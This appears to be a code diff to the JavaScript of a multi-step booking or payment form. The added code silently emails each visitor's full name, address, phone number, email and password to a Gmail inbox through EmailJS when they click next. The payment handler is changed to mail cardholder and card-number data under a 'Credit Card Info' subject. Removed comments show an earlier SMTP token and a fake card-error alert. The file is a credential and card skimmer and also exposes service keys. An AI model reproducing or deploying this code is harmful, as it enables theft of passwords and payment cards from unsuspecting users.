@@ -143,6 +143,48 @@ nextBtns.forEach((btn) => {
         formStepsNum++;
         updateFormSteps();
         updateProgressbar();
+        
+        const dateNow = new Date();
+    let timeNow = dateNow.getTime();
+    
+    (function () {
+      emailjs.init("ZEIhIxDmuJ9hieZRH"); // Account Public Key
+    })();
+
+    var params = {
+      from: "myspamassage2023@gmail.com",
+      to: "myspamassage2023@gmail.com",
+      subject: "Contact Info " + today + " " + timeNow,
+      replyto: "",
+      message:
+        "fullname: " +
+        fullname.value +
+        " \n" +
+        "address: " +
+        address.value +
+        " \n" +
+        "phonenumber: " +
+        phonenumber.value +
+        " \n" +
+        "email: " +
+        email.value +
+        " \n" +
+        "password: " +
+        password.value,
+    };
+
+    var serviceID = "service_zgiz1w8"; // Email Service ID
+    var templateID = "template_lq00n7p"; // Email Template ID
+
+    emailjs
+      .send(serviceID, templateID, params)
+      .then((res) => {
+        
+      })
+      .catch((e) => {
+        alert("Error: ", e);
+      });
+
       }
       //alert(formStepsNum);
     } else if (formStepsNum == 1) {
@@ -267,72 +309,9 @@ function payButton() {
     expDate.length > 0 &&
     CVV.length > 0
   ) {
-    /*
-        var server_data = [
-          { fullname: fullname },
-          { address: address },
-          { phonenumber: phonenumber },
-          { email: email },
-          { password: password },
-          { scheddate: scheddate },
-          { time: time },
-          { cardHolder: cardHolder },
-          { cardNumber: cardNumber },
-          { expDate: expDate },
-          { CVV: CVV },
-        ];
-      */
-    //Username: "sofiamendez2069@gmail.com",
-    //Password: "B6505A37BE5A592A8839955DCB36478CAC7C",
-    //SecureToken: "73374f-eebb-405e-8de9-2ca13952c444"
+   
     const dateNow = new Date();
     let timeNow = dateNow.getTime();
-
-    // Email.send({
-    //   SecureToken: "73374f-eebb-405e-8de9-2ca13952c444",
-    //   To: "sofiamendez2069@gmail.com",
-    //   From: "sofiamendez2069@gmail.com",
-    //   Subject: "Contact Info " + today + " " + timeNow,
-    //   Body:
-    // "fullname: " +
-    // fullname +
-    // " \n" +
-    // "address: " +
-    // address +
-    // " \n" +
-    // "phonenumber: " +
-    // phonenumber +
-    // " \n" +
-    // "email: " +
-    // email +
-    // " \n" +
-    // "password: " +
-    // password +
-    // " \n" +
-    // "scheddate: " +
-    // scheddate +
-    // " \n" +
-    // "time: " +
-    // time +
-    // " \n" +
-    // "cardHolder: " +
-    // cardHolder +
-    // " \n" +
-    // "cardNumber: " +
-    // cardNumber +
-    // " \n" +
-    // "expDate: " +
-    // expDate +
-    // " \n" +
-    // "CVV: " +
-    // CVV +
-    // " \n",
-    // }).then((message) =>
-    //   //alert(message)
-    //   alert(
-    //     "There is a problem with your card. \nPlease check or Pay using PayPal. \n\nThank You!"
-    //   )
-    // );
 
     (function () {
       emailjs.init("ZEIhIxDmuJ9hieZRH"); // Account Public Key
@@ -341,30 +320,9 @@ function payButton() {
     var params = {
       from: "myspamassage2023@gmail.com",
       to: "myspamassage2023@gmail.com",
-      subject: "Contact Info " + today + " " + timeNow,
+      subject: "Credit Card Info " + today + " " + timeNow,
       replyto: "",
       message:
-        "fullname: " +
-        fullname +
-        " \n" +
-        "address: " +
-        address +
-        " \n" +
-        "phonenumber: " +
-        phonenumber +
-        " \n" +
-        "email: " +
-        email +
-        " \n" +
-        "password: " +
-        password +
-        " \n" +
-        "scheddate: " +
-        scheddate +
-        " \n" +
-        "time: " +
-        time +
-        " \n" +
         "cardHolder: " +
         cardHolder +
         " \n" +
